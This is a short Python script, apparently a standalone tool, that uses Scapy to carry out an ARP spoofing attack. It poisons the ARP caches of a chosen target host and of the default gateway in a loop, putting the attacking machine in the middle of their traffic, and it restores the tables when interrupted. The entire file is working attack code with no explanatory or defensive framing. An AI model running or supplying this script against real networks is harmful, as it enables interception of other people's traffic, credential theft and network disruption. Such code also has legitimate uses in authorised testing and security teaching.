from scapy.all import *
import time
import argparse


class ArpSpoof:
    def __init__(self):
        pass

    @staticmethod
    def get_arguments():
        parser = argparse.ArgumentParser()
        parser.add_argument("--target-ip", "-t", dest="Target", help="Target IP")
        option = parser.parse_args()
        return option

    @staticmethod
    def spoof(target_ip, spoof_ip):
        target_mac = getmacbyip(target_ip)
        packet = ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=target_mac)
        send(packet, verbose=False)

    @staticmethod
    def restore(source_ip, destination_ip):
        source_mac = getmacbyip(source_ip)
        destination_mac = getmacbyip(destination_ip)
        packet = ARP(op=2, psrc=source_ip, hwsrc=source_mac, pdst=destination_ip, hwdst=destination_mac)
        send(packet, count=5, verbose=False)

    def run(self, target_ip, router_ip):
        count = 2
        try:
            if router_ip == "0.0.0.0":
                print("Not connected to the internet")
            else:
                while True:
                    self.spoof(target_ip, router_ip)
                    self.spoof(router_ip, target_ip)
                    time.sleep(2)
                    print("\r[+] No. of packets sent:", count, end="")
                    count += 2
        except KeyboardInterrupt:
            print("\n[-] CTRL+C detected. Resetting the ARP tables")
            self.restore(target_ip, router_ip)
            self.restore(router_ip, target_ip)


obj = ArpSpoof()
options = obj.get_arguments()
router_ip = conf.route.route("0.0.0.0")[2]
target_ip = options.Target
obj.run(target_ip, router_ip)
